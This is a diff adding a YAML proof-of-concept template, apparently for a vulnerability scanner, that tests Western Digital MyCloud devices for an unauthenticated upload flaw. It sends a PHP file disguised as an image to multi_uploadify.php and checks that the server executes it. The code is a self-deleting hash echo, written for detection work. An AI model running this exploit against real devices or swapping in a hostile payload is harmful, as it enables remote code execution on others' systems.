@@ -1,0 +1,39 @@
+name: yaml-poc-westerndigital-mycloud-file_upload-CT-416681
+binding: 4ada168f-7bf2-47c5-8d34-d398971c3241
+detail:
+    author: system_user
+    vulnerability:
+        id: 46e8a430-8c1b-4413-9a88-04eff746c7da
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    f1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /web/jquery/uploader/multi_uploadify.php?status=1
+            follow_redirects: false
+        expression: response.status == 302 && response.headers["location"].contains("status=1")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /web/jquery/uploader/multi_uploadify.php?folder=/var/www/
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"Filedata[]\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 302
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /{{randname}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(f1))))
+expression: r0() && r1() && r2()
